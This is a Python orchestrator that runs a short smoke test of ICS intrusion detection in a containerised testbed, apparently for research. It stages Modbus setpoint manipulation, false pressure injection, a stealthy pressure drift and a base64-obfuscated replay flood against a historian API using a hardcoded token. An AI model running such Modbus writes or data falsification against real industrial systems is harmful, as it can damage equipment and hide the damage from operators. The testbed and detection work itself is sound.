#!/usr/bin/env python3
"""
Insider / HMI Setpoint Attack Smoke Test Orchestrator
=====================================================
Runs a compressed ~5-minute smoke test to test the insider attack hypothesis:
1. Insider setpoint changes via SCADA/HMI authorized Modbus channels evade Layer 1 and ML_net.
2. Process-domain layers (Layer 2, Layer 3, ML_proc) catch the physical pressure deviation.
"""

import os
import sys
import time
import datetime
import subprocess
import csv

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RESULTS_DIR = os.path.join(PROJECT_DIR, "results")
SMOKE_DIR   = os.path.join(RESULTS_DIR, "insider_smoke_test_data")
ATTACK_CSV  = os.path.join(SMOKE_DIR, "attack_results_extended.csv")
LOG_FILE    = os.path.join(RESULTS_DIR, "insider_smoke_run.log")

EVAL_PYTHON = sys.executable

os.makedirs(SMOKE_DIR, exist_ok=True)

def log(msg):
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def record_attack(phase, name, status, detail=""):
    utc_now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    with open(ATTACK_CSV, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([utc_now, phase, name, status, detail])
    log(f"RECORDED: Phase {phase} ({name}) - {status} - {detail}")

def utc_now_iso():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

def run_cmd(cmd, label=""):
    log(f"EXEC [{label}]: {cmd}")
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if res.returncode != 0:
        log(f"  [ERROR] Exit code {res.returncode}: {res.stderr}")
    return res.stdout.strip()

def run_insider_setpoint_attack(rpm=2800, valve=0, hold_s=10):
    """
    Simulates an insider / HMI setpoint manipulation.
    Issued via Modbus Function Code 6 to register 200 (pump RPM) and 201 (valve pos).
    Uses legitimate Modbus client connection (mimicking HMI/SCADA workstation).
    """
    cmd = (
        f"docker exec -t attacker_node python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient(host='plc_simulator', port=502); c.connect(); "
        f"c.write_register(200, {rpm}); time.sleep(1); "
        f"c.write_register(201, {valve}); time.sleep({hold_s}); "
        f"c.write_register(200, 1200); "
        f"c.write_register(201, 500); c.close()\""
    )
    run_cmd(cmd, label="Insider Attack")

def run_semantic_injection(pressure=350):
    cmd = (
        f"docker exec -t attacker_node python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; "
        f"c = ModbusTcpClient(host='plc_simulator', port=502); c.connect(); "
        f"c.write_register(100, {pressure}); c.close()\""
    )
    run_cmd(cmd, label="Phase 4 Semantic Injection")

def run_stealth_drift(step_psi=3, delay_s=5, num_steps=6):
    drift_loop = f"for i in range({num_steps}): c.write_register(100, base + (i+1)*{step_psi}); time.sleep({delay_s})"
    cmd = (
        f"docker exec -t attacker_node python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient(host='plc_simulator', port=502); c.connect(); "
        f"base = c.read_holding_registers(100, count=1).registers[0]; "
        f"exec({drift_loop!r}); c.close()\""
    )
    run_cmd(cmd, label="Phase 5 Stealth Drift")

def run_replay_attack(pressure=125.0, count=150, frame_delay_s=0.1):
    import base64
    endpoint = "http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns"
    script = (
        f"import time, requests\n"
        f"ep = '{endpoint}'\n"
        f"hdr = {{'Authorization': 'Token supersecrettoken', 'Content-Type': 'text/plain; charset=utf-8'}}\n"
        f"for _ in range({count}):\n"
        f"    requests.post(ep, headers=hdr, data='pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={pressure} ' + str(time.time_ns()), timeout=2)\n"
        f"    time.sleep({frame_delay_s})\n"
    )
    b64_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')
    cmd = f"docker exec -t attacker_node python3 -c \"import base64; exec(base64.b64decode('{b64_script}').decode('utf-8'))\""
    run_cmd(cmd, label="Phase 8 Replay Attack")

def reset_ml_engine():
    run_cmd("docker exec -t ics_ml_engine python3 -c \"import requests; requests.post('http://localhost:8000/retrain', timeout=5)\"", label="Reset ML Engine")

def main():
    log("=" * 70)
    log("INSIDER ATTACK SMOKE TEST — Phase 1: Baseline (60s)")
    log("=" * 70)
    campaign_start = utc_now_iso()
    
    # Initialize attack results CSV
    with open(ATTACK_CSV, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "phase", "phase_name", "status", "detail"])
        
    for tick in range(6):
        time.sleep(10)
        log(f"  Baseline: {(tick+1)*10}/60 s elapsed")

    reset_ml_engine()
    log("Waiting 15 s for model fit ...")
    time.sleep(15)

    log("=" * 70)
    log("INSIDER ATTACK SMOKE TEST — Phase 2: Validation (Stealth Drift + Insider Attack 1)")
    log("=" * 70)
    record_attack(5, "phase5_payload", "started", "Validation — Stealth Drift +3 PSI x 6")
    run_stealth_drift(step_psi=3, delay_s=5, num_steps=6) # 30s
    record_attack(5, "phase5_payload", "completed")
    time.sleep(10)

    record_attack(9, "phase9_insider", "started", "Validation — Insider Setpoint RPM=2800 Valve=0 hold=10s")
    run_insider_setpoint_attack(rpm=2800, valve=0, hold_s=10) # 10s
    record_attack(9, "phase9_insider", "completed")
    time.sleep(30)

    log("=" * 70)
    log("INSIDER ATTACK SMOKE TEST — Phase 3: Test (Insider Attack 2 + Phase 4 + Phase 8)")
    log("=" * 70)
    record_attack(9, "phase9_insider", "started", "Test — Insider Setpoint RPM=3000 Valve=0 hold=10s")
    run_insider_setpoint_attack(rpm=3000, valve=0, hold_s=10)
    record_attack(9, "phase9_insider", "completed")
    time.sleep(20)

    record_attack(4, "phase4_exploit", "started", "Test — Phase 4 Injection 350 PSI")
    run_semantic_injection(pressure=350)
    record_attack(4, "phase4_exploit", "completed")
    time.sleep(20)

    record_attack(8, "phase8_replay", "started", "Test — Phase 8 Replay 125 PSI x 150 frames")
    run_replay_attack(pressure=125.0, count=150, frame_delay_s=0.1)
    record_attack(8, "phase8_replay", "completed")

    log("Attacks complete. Cooling down 40 s ...")
    time.sleep(40)
    campaign_end = utc_now_iso()

    log("=" * 70)
    log("Exporting telemetry to results/insider_smoke_test_data ...")
    log("=" * 70)
    save_script = os.path.join(PROJECT_DIR, "scripts", "save_results.py")
    cmd_export = (
        f"{shlex_quote(EVAL_PYTHON)} {shlex_quote(save_script)} "
        f"--start {shlex_quote(campaign_start)} "
        f"--stop {shlex_quote(campaign_end)} "
        f"--out-dir {shlex_quote(SMOKE_DIR)}"
    )
    run_cmd(cmd_export, label="Save Telemetry CSVs")
    
    # Copy attack_results_extended.csv into SMOKE_DIR
    run_cmd(f"cp {shlex_quote(ATTACK_CSV)} {shlex_quote(SMOKE_DIR)}/", label="Copy attack CSV")
    log(f"SUCCESS: Smoke test data exported to {SMOKE_DIR}")

def shlex_quote(s):
    import shlex
    return shlex.quote(s)

if __name__ == "__main__":
    main()
